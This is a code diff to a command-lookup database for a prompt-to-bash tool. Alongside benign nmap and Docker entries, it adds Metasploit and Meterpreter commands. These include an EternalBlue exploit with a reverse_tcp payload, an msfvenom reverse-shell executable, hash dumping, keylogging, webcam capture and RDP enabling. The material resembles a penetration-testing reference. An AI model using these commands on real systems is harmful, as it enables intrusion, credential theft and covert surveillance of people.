@@ -54,22 +54,72 @@ const commandDatabase = {
     ]
   },
 
-  // Network Operations
+  // Network Operations - Enhanced with Nmap
   'network_operations': {
-    patterns: ['network', 'ping', 'wget', 'curl', 'ssh', 'scp', 'rsync', 'netstat', 'ss', 'iptables', 'firewall', 'port', 'connection', 'nmap', 'dig', 'nslookup', 'telnet', 'ftp', 'sftp', 'nc', 'netcat', 'traceroute', 'mtr', 'whois', 'tcpdump', 'wireshark'],
+    patterns: ['network', 'ping', 'wget', 'curl', 'ssh', 'scp', 'rsync', 'netstat', 'ss', 'iptables', 'firewall', 'port', 'connection', 'nmap', 'dig', 'nslookup', 'telnet', 'ftp', 'sftp', 'nc', 'netcat', 'traceroute', 'mtr', 'whois', 'tcpdump', 'wireshark', 'scan', 'discover', 'enumerate'],
     commands: [
+      // Nmap Commands
       {
         command: 'nmap -sn 192.168.1.0/24',
         explanation: 'Performs a ping scan to discover live hosts in the specified network range.',
         category: 'Network Operations',
-        keywords: ['nmap', 'ping', 'scan', 'hosts', 'network', 'range', 'discover']
+        keywords: ['nmap', 'ping', 'scan', 'hosts', 'network', 'range', 'discover', 'host', 'discovery']
       },
       {
-        command: 'nmap -sS -sV -O target_ip',
-        explanation: 'Performs TCP SYN scan with version detection and OS fingerprinting on target.',
+        command: 'nmap -sS target_ip',
+        explanation: 'Performs TCP SYN scan (stealth scan) on target to identify open ports.',
         category: 'Network Operations',
-        keywords: ['nmap', 'tcp', 'syn', 'scan', 'version', 'detection', 'os', 'fingerprint']
+        keywords: ['nmap', 'tcp', 'syn', 'scan', 'stealth', 'ports', 'open']
       },
+      {
+        command: 'nmap -sV target_ip',
+        explanation: 'Performs version detection scan to identify service versions running on open ports.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'version', 'detection', 'service', 'versions', 'banner']
+      },
+      {
+        command: 'nmap -O target_ip',
+        explanation: 'Performs OS fingerprinting to identify the target operating system.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'os', 'fingerprint', 'operating', 'system', 'detection']
+      },
+      {
+        command: 'nmap -A target_ip',
+        explanation: 'Aggressive scan combining OS detection, version detection, script scanning, and traceroute.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'aggressive', 'scan', 'comprehensive', 'detection', 'script']
+      },
+      {
+        command: 'nmap -sU target_ip',
+        explanation: 'Performs UDP scan to identify open UDP ports on target.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'udp', 'scan', 'ports', 'user', 'datagram']
+      },
+      {
+        command: 'nmap --script vuln target_ip',
+        explanation: 'Runs vulnerability detection scripts against target to identify known vulnerabilities.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'script', 'vulnerability', 'vuln', 'detection', 'exploit']
+      },
+      {
+        command: 'nmap -p- target_ip',
+        explanation: 'Scans all 65535 TCP ports on target for comprehensive port discovery.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'all', 'ports', 'comprehensive', 'full', 'range']
+      },
+      {
+        command: 'nmap -p 80,443,22,21 target_ip',
+        explanation: 'Scans specific ports (HTTP, HTTPS, SSH, FTP) on target.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'specific', 'ports', 'http', 'https', 'ssh', 'ftp']
+      },
+      {
+        command: 'nmap -T4 target_ip',
+        explanation: 'Fast timing template scan for quicker results on target.',
+        category: 'Network Operations',
+        keywords: ['nmap', 'timing', 'fast', 'aggressive', 'speed']
+      },
+      // ... keep existing code (other network commands)
       {
         command: 'dig google.com',
         explanation: 'Performs DNS lookup for google.com showing detailed DNS record information.',
@@ -105,6 +155,327 @@ const commandDatabase = {
         explanation: 'Traces the network path to google.com showing all intermediate hops.',
         category: 'Network Operations',
         keywords: ['traceroute', 'trace', 'path', 'hops', 'route']
+      }
+    ]
+  },
+
+  // Metasploit Framework Commands
+  'metasploit_operations': {
+    patterns: ['metasploit', 'msfconsole', 'msfvenom', 'exploit', 'payload', 'auxiliary', 'post', 'encoder', 'nop', 'msf'],
+    commands: [
+      {
+        command: 'msfconsole',
+        explanation: 'Launches the Metasploit Framework console for interactive exploitation.',
+        category: 'Metasploit Operations',
+        keywords: ['msfconsole', 'metasploit', 'console', 'launch', 'start', 'framework']
+      },
+      {
+        command: 'search type:exploit platform:windows',
+        explanation: 'Searches for Windows exploits in Metasploit database.',
+        category: 'Metasploit Operations',
+        keywords: ['search', 'exploit', 'windows', 'platform', 'find']
+      },
+      {
+        command: 'use exploit/windows/smb/ms17_010_eternalblue',
+        explanation: 'Selects the EternalBlue SMB exploit for Windows systems.',
+        category: 'Metasploit Operations',
+        keywords: ['use', 'exploit', 'eternalblue', 'smb', 'ms17', 'windows']
+      },
+      {
+        command: 'set RHOSTS 192.168.1.100',
+        explanation: 'Sets the target host IP address for the selected exploit.',
+        category: 'Metasploit Operations',
+        keywords: ['set', 'rhosts', 'target', 'host', 'ip', 'address']
+      },
+      {
+        command: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
+        explanation: 'Sets a Windows 64-bit Meterpreter reverse TCP payload.',
+        category: 'Metasploit Operations',
+        keywords: ['set', 'payload', 'meterpreter', 'reverse', 'tcp', 'windows']
+      },
+      {
+        command: 'set LHOST 192.168.1.50',
+        explanation: 'Sets the local host IP address for reverse connections.',
+        category: 'Metasploit Operations',
+        keywords: ['set', 'lhost', 'local', 'host', 'ip', 'reverse']
+      },
+      {
+        command: 'set LPORT 4444',
+        explanation: 'Sets the local port for reverse connections.',
+        category: 'Metasploit Operations',
+        keywords: ['set', 'lport', 'local', 'port', 'listener']
+      },
+      {
+        command: 'show options',
+        explanation: 'Displays all configurable options for the current module.',
+        category: 'Metasploit Operations',
+        keywords: ['show', 'options', 'configure', 'parameters', 'settings']
+      },
+      {
+        command: 'exploit',
+        explanation: 'Executes the configured exploit against the target.',
+        category: 'Metasploit Operations',
+        keywords: ['exploit', 'execute', 'run', 'launch', 'attack']
+      },
+      {
+        command: 'background',
+        explanation: 'Backgrounds the current session to return to main console.',
+        category: 'Metasploit Operations',
+        keywords: ['background', 'session', 'return', 'console']
+      },
+      {
+        command: 'sessions -l',
+        explanation: 'Lists all active sessions.',
+        category: 'Metasploit Operations',
+        keywords: ['sessions', 'list', 'active', 'show']
+      },
+      {
+        command: 'sessions -i 1',
+        explanation: 'Interacts with session number 1.',
+        category: 'Metasploit Operations',
+        keywords: ['sessions', 'interact', 'connect', 'session']
+      },
+      {
+        command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe',
+        explanation: 'Generates a Windows executable payload with Meterpreter reverse TCP connection.',
+        category: 'Metasploit Operations',
+        keywords: ['msfvenom', 'payload', 'generate', 'executable', 'meterpreter', 'reverse']
+      },
+      {
+        command: 'use auxiliary/scanner/portscan/tcp',
+        explanation: 'Uses TCP port scanner auxiliary module.',
+        category: 'Metasploit Operations',
+        keywords: ['auxiliary', 'scanner', 'portscan', 'tcp', 'port']
+      },
+      {
+        command: 'use post/windows/gather/hashdump',
+        explanation: 'Uses post-exploitation module to dump password hashes.',
+        category: 'Metasploit Operations',
+        keywords: ['post', 'exploitation', 'hashdump', 'passwords', 'gather']
+      }
+    ]
+  },
+
+  // Meterpreter Commands
+  'meterpreter_operations': {
+    patterns: ['meterpreter', 'meterpreter session', 'shell', 'post exploitation', 'privilege escalation'],
+    commands: [
+      {
+        command: 'sysinfo',
+        explanation: 'Displays system information about the compromised target.',
+        category: 'Meterpreter Operations',
+        keywords: ['sysinfo', 'system', 'information', 'target', 'details']
+      },
+      {
+        command: 'getuid',
+        explanation: 'Shows the current user ID and privileges on the target system.',
+        category: 'Meterpreter Operations',
+        keywords: ['getuid', 'user', 'id', 'privileges', 'current']
+      },
+      {
+        command: 'getsystem',
+        explanation: 'Attempts to escalate privileges to SYSTEM level on Windows.',
+        category: 'Meterpreter Operations',
+        keywords: ['getsystem', 'privilege', 'escalation', 'system', 'windows']
+      },
+      {
+        command: 'ps',
+        explanation: 'Lists all running processes on the target system.',
+        category: 'Meterpreter Operations',
+        keywords: ['ps', 'processes', 'running', 'list', 'show']
+      },
+      {
+        command: 'migrate 1234',
+        explanation: 'Migrates the Meterpreter session to process ID 1234.',
+        category: 'Meterpreter Operations',
+        keywords: ['migrate', 'process', 'move', 'pid', 'stealth']
+      },
+      {
+        command: 'hashdump',
+        explanation: 'Dumps password hashes from the target system.',
+        category: 'Meterpreter Operations',
+        keywords: ['hashdump', 'passwords', 'hashes', 'dump', 'credentials']
+      },
+      {
+        command: 'screenshot',
+        explanation: 'Takes a screenshot of the target desktop.',
+        category: 'Meterpreter Operations',
+        keywords: ['screenshot', 'desktop', 'capture', 'image', 'screen']
+      },
+      {
+        command: 'webcam_snap',
+        explanation: 'Takes a picture using the target webcam.',
+        category: 'Meterpreter Operations',
+        keywords: ['webcam', 'snap', 'picture', 'camera', 'capture']
+      },
+      {
+        command: 'keyscan_start',
+        explanation: 'Starts keylogger to capture keystrokes.',
+        category: 'Meterpreter Operations',
+        keywords: ['keyscan', 'keylogger', 'start', 'capture', 'keystrokes']
+      },
+      {
+        command: 'keyscan_dump',
+        explanation: 'Dumps captured keystrokes from keylogger.',
+        category: 'Meterpreter Operations',
+        keywords: ['keyscan', 'dump', 'keystrokes', 'show', 'captured']
+      },
+      {
+        command: 'download C:\\important.txt /tmp/',
+        explanation: 'Downloads a file from target to local system.',
+        category: 'Meterpreter Operations',
+        keywords: ['download', 'file', 'transfer', 'get', 'copy']
+      },
+      {
+        command: 'upload /tmp/file.exe C:\\temp\\',
+        explanation: 'Uploads a file from local system to target.',
+        category: 'Meterpreter Operations',
+        keywords: ['upload', 'file', 'transfer', 'put', 'copy']
+      },
+      {
+        command: 'shell',
+        explanation: 'Drops into a system shell on the target.',
+        category: 'Meterpreter Operations',
+        keywords: ['shell', 'command', 'prompt', 'system', 'terminal']
+      },
+      {
+        command: 'run post/windows/manage/enable_rdp',
+        explanation: 'Enables Remote Desktop Protocol on Windows target.',
+        category: 'Meterpreter Operations',
+        keywords: ['run', 'post', 'rdp', 'remote', 'desktop', 'enable']
+      },
+      {
+        command: 'portfwd add -l 3389 -p 3389 -r 192.168.1.100',
+        explanation: 'Sets up port forwarding for RDP access.',
+        category: 'Meterpreter Operations',
+        keywords: ['portfwd', 'port', 'forwarding', 'tunnel', 'rdp']
+      }
+    ]
+  },
+
+  // Docker Commands
+  'docker_operations': {
+    patterns: ['docker', 'container', 'image', 'dockerfile', 'compose', 'registry', 'hub'],
+    commands: [
+      {
+        command: 'docker run -it ubuntu:latest /bin/bash',
+        explanation: 'Runs an interactive Ubuntu container with bash shell.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'run', 'interactive', 'ubuntu', 'bash', 'container']
+      },
+      {
+        command: 'docker ps',
+        explanation: 'Lists all currently running Docker containers.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'ps', 'list', 'running', 'containers', 'show']
+      },
+      {
+        command: 'docker ps -a',
+        explanation: 'Lists all Docker containers including stopped ones.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'ps', 'all', 'containers', 'stopped', 'list']
+      },
+      {
+        command: 'docker images',
+        explanation: 'Lists all Docker images stored locally.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'images', 'list', 'local', 'stored']
+      },
+      {
+        command: 'docker pull nginx:latest',
+        explanation: 'Downloads the latest Nginx image from Docker Hub.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'pull', 'download', 'nginx', 'image', 'hub']
+      },
+      {
+        command: 'docker build -t myapp:1.0 .',
+        explanation: 'Builds a Docker image from Dockerfile in current directory with tag.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'build', 'image', 'dockerfile', 'tag', 'create']
+      },
+      {
+        command: 'docker stop container_name',
+        explanation: 'Stops a running Docker container by name.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'stop', 'container', 'halt', 'shutdown']
+      },
+      {
+        command: 'docker start container_name',
+        explanation: 'Starts a stopped Docker container by name.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'start', 'container', 'run', 'launch']
+      },
+      {
+        command: 'docker rm container_name',
+        explanation: 'Removes a Docker container by name.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'rm', 'remove', 'delete', 'container']
+      },
+      {
+        command: 'docker rmi image_name',
+        explanation: 'Removes a Docker image by name.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'rmi', 'remove', 'delete', 'image']
+      },
+      {
+        command: 'docker exec -it container_name /bin/bash',
+        explanation: 'Executes bash shell inside a running container.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'exec', 'execute', 'bash', 'shell', 'interactive']
+      },
+      {
+        command: 'docker logs container_name',
+        explanation: 'Shows logs from a Docker container.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'logs', 'container', 'output', 'show']
+      },
+      {
+        command: 'docker-compose up -d',
+        explanation: 'Starts services defined in docker-compose.yml in detached mode.',
+        category: 'Docker Operations',
+        keywords: ['docker-compose', 'up', 'start', 'services', 'detached', 'background']
+      },
+      {
+        command: 'docker-compose down',
+        explanation: 'Stops and removes containers, networks created by docker-compose up.',
+        category: 'Docker Operations',
+        keywords: ['docker-compose', 'down', 'stop', 'remove', 'cleanup']
+      },
+      {
+        command: 'docker system prune',
+        explanation: 'Removes unused containers, networks, images, and build cache.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'system', 'prune', 'cleanup', 'remove', 'unused']
+      },
+      {
+        command: 'docker volume ls',
+        explanation: 'Lists all Docker volumes.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'volume', 'list', 'storage', 'show']
+      },
+      {
+        command: 'docker network ls',
+        explanation: 'Lists all Docker networks.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'network', 'list', 'show', 'networking']
+      },
+      {
+        command: 'docker inspect container_name',
+        explanation: 'Shows detailed information about a Docker container.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'inspect', 'information', 'details', 'container']
+      },
+      {
+        command: 'docker cp file.txt container_name:/path/',
+        explanation: 'Copies files between host and Docker container.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'cp', 'copy', 'file', 'transfer', 'container']
+      },
+      {
+        command: 'docker run -d -p 80:80 nginx',
+        explanation: 'Runs Nginx container in background with port mapping.',
+        category: 'Docker Operations',
+        keywords: ['docker', 'run', 'detached', 'port', 'mapping', 'nginx', 'background']
       }
     ]
   },
@@ -546,7 +917,7 @@ export async function generateBashCommand(prompt: string): Promise<CommandResult
   // Default response when no specific match is found
   return {
     command: 'echo "Command not found. Please be more specific."',
-    explanation: `I couldn't find a specific command for "${prompt}". Try using more specific keywords like: 'nmap' for network scanning, 'grep' for text search, 'systemctl' for service management, 'docker' for containers, 'git' for version control, 'find' for file search, 'ps' for processes, 'netstat' for network connections, or describe your task more specifically (e.g., "scan network for open ports", "search for text in files", "monitor CPU usage").`,
+    explanation: `I couldn't find a specific command for "${prompt}". Try using more specific keywords like: 'nmap' for network scanning, 'msfconsole' for Metasploit, 'meterpreter' for post-exploitation, 'docker' for containers, 'grep' for text search, 'systemctl' for service management, 'git' for version control, 'find' for file search, 'ps' for processes, or describe your task more specifically.`,
     category: 'Help'
   };
 }
